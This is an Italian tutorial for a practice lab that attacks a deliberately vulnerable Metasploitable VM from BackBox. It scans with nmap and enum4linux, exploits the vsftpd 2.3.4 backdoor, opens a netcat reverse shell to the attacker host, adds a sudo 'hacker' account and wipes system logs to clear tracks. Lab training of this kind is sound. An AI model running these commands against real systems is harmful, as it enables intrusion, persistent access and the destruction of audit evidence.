![Descrizione immagine](https://trinity-core.s3.us-west-1.amazonaws.com/techjury/assets/64d25602431a8.png)

# Guida Completa: Ethical Hacking con Metasploitable su Backbox

Questa guida ti accompagnerà passo dopo passo nell'installazione e configurazione di un ambiente di test per ethical hacking utilizzando Backbox come sistema operativo host e Metasploitable come macchina vulnerabile su VirtualBox. Include tutte le 5 fasi dell'ethical hacking: Reconnaissance, Scanning, Gaining Access, Maintaining Access, e Clearing Tracks.

---

## **Introduzione**

L'obiettivo di questa guida è fornire un percorso completo, comprensibile anche a un principiante, per eseguire un ciclo completo di ethical hacking. Seguendo questa guida, potrai:

- Configurare l'ambiente virtuale.
- Sfruttare vulnerabilità presenti su Metasploitable.
- Ottenere accesso persistente.
- Pulire tracce per simulare un comportamento da penetration tester professionista.

**Nota Bene:** Queste tecniche devono essere utilizzate esclusivamente in ambienti controllati e autorizzati.

---

## **1. Preparazione dell'Ambiente**

### **Installazione e Configurazione di VirtualBox**

1. Scarica VirtualBox dal sito ufficiale: [https://www.virtualbox.org/](https://www.virtualbox.org/).
2. Scarica l'immagine di Metasploitable: [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/).
3. Decomprimi l'archivio e ottieni il file `.vmdk`.

### **Configurazione della Macchina Virtuale**

1. Apri VirtualBox e crea una nuova macchina virtuale:
   - Nome: `Metasploitable`.
   - Tipo: Linux.
   - Versione: Ubuntu (32-bit).
   - RAM: Assegna almeno 512 MB.
2. Collega il disco virtuale `.vmdk`:
   - Vai su **Impostazioni > Archiviazione**.
   - Aggiungi il file `.vmdk` come disco rigido esistente.
3. Configura la rete:
   - Vai su **Impostazioni > Rete**.
   - Imposta la scheda di rete su **Scheda con Bridge**.
   - Modalità promiscua: Consenti tutto.
4. Salva le impostazioni e avvia la macchina.

### Verifica della Connessione

1. Accedi alla macchina Metasploitable.
2. Controlla l'indirizzo IP usando:
   ```bash
   ifconfig
   ```
   Prendi nota dell'IP associato a `eth0`.
3. Controlla l'indirizzo IP del tuo sistema Backbox:
   ```bash
   ifconfig
   ```
   Prendi nota dell'indirizzo IP associato alla rete configurata.
4. Assicurati che le due macchine siano sulla stessa rete:
   ```bash
   ping <IP_della_macchina_opposta>
   ```
   Se il ping non funziona, controlla le impostazioni di rete su VirtualBox.

---

## **2. Fase 1: Reconnaissance**

La fase di Reconnaissance consiste nel raccogliere dati dettagliati sul target per identificare potenziali vulnerabilità.

### Raccolta delle Informazioni

#### Comando 1: Scansione iniziale
1. Esegui una scansione iniziale con Nmap:
   ```bash
   nmap -sV <IP_Metasploitable>
   ```

#### Comando 2: Scansione avanzata
2. Esegui una scansione approfondita con Nmap:
   ```bash
   nmap -sV -A <IP_Metasploitable>
   ```

#### Comando 3: Analisi con Nikto
3. Analizza specifici servizi come il web server:
   ```bash
   nikto -h <IP_Metasploitable>
   ```

---

## **3. Fase 2: Scanning**

La fase di Scanning analizza le porte e i servizi per identificare possibili punti di ingresso.

### Scansione Dettagliata

#### Comando 1: Scansione completa delle porte
1. Effettua una scansione completa:
   ```bash
   nmap -p- <IP_Metasploitable>
   ```

#### Comando 2: Script di vulnerabilità
2. Usa script di rilevamento vulnerabilità:
   ```bash
   nmap --script vuln <IP_Metasploitable>
   ```

#### Comando 3: Enum4Linux
3. Usa Enum4Linux per enumerare condivisioni Samba e utenti:
   ```bash
   enum4linux -a <IP_Metasploitable>
   ```

---

## **4. Fase 3: Gaining Access**

La fase di Gaining Access sfrutta vulnerabilità per ottenere l'accesso al sistema target.

### Esecuzione di un Exploit con Metasploit

#### Comando 1: Avvio di Metasploit
1. Avvia Metasploit:
   ```bash
   msfconsole
   ```

#### Comando 2: Configurazione dell'exploit
2. Usa l'exploit per il servizio FTP vulnerabile:
   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOST <IP_Metasploitable>
   exploit
   ```

#### Comando 3: Verifica degli utenti
3. Verifica di avere una shell attiva:
   ```bash
   cat /etc/passwd
   ```

---

## **5. Fase 4: Maintaining Access**

La fase di Maintaining Access configura metodi per mantenere il controllo del sistema.

### Configurazione di una Reverse Shell Persistente

#### Comando 1: Configurazione dell'Handler
1. Configura Metasploit:
   ```bash
   use exploit/multi/handler
   set payload linux/x86/shell_reverse_tcp
   set LHOST <IP_Backbox>
   set LPORT 4444
   exploit
   ```

#### Comando 2: Avvio della Reverse Shell
2. Su Metasploitable, esegui:
   ```bash
   nc <IP_Backbox> 4444 -e /bin/bash
   ```

### Creazione di un Utente con Privilegi di Root
1. Crea un nuovo utente:
   ```bash
   useradd -m -s /bin/bash -G sudo hacker
   passwd hacker
   ```

---

## **6. Fase 5: Clearing Tracks**

La fase di Clearing Tracks rimuove tutte le tracce delle attività.

### Pulizia dei Log di Sistema

#### Comando 1: Svuotamento dei file di log
1. Svuota i file di log:
   ```bash
   > /var/log/auth.log
   > /var/log/syslog
   > /var/log/messages
   ```

#### Comando 2: Verifica dei log
2. Verifica che i log siano vuoti:
   ```bash
   cat /var/log/auth.log
   ```

---

## **Conclusione**

Seguendo questa guida, hai completato con successo tutte le 5 fasi del processo di ethical hacking. Ora puoi continuare a esercitarti in ambienti più complessi, utilizzando strumenti avanzati come OWASP Top 10 o MITRE ATT&CK. Ricorda di applicare queste tecniche solo in contesti legali e autorizzati.
